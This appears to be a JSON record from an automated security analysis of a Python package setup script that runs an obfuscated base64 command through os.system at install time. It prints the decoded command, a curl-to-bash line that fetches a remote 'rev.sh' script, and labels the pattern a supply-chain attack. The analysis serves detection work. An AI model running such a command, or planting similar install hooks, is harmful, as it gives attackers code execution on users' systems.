{
  "purpose": "The code defines a Python package setup script that, upon installation or development setup, executes a command to perform a network request to a specified URL.",
  "sources": "The function b64d decodes a base64-encoded string to obtain a command; the command is executed via os.system in notmalfunc() during installation.",
  "sinks": "The os.system call executes the decoded command, which could be malicious if the base64-encoded string is maliciously crafted.",
  "flows": "Base64 string is decoded by b64d, then passed directly to os.system, leading to command execution during installation.",
  "anomalies": "The base64-encoded string decodes to 'curl -s http://localhost:8000/rev.sh | bash', indicating a network request and remote script execution. This is hidden and obfuscated behavior.",
  "analysis": "The script imports setuptools for package setup, then defines a function to decode base64 strings. The function notmalfunc() executes a network command via os.system, which is called during the 'install' command. The command, when decoded, fetches and executes a remote script from localhost:8000, which is suspicious as it indicates remote code execution. The use of base64 decoding to hide the command suggests malicious intent. The code's structure leverages setuptools hooks to execute malicious code during installation, a common supply chain attack vector.",
  "conclusion": "The code contains obfuscated and malicious behavior by decoding and executing a remote script during installation. This indicates a high likelihood of malicious intent, possibly for remote command execution or backdooring the system during package install.",
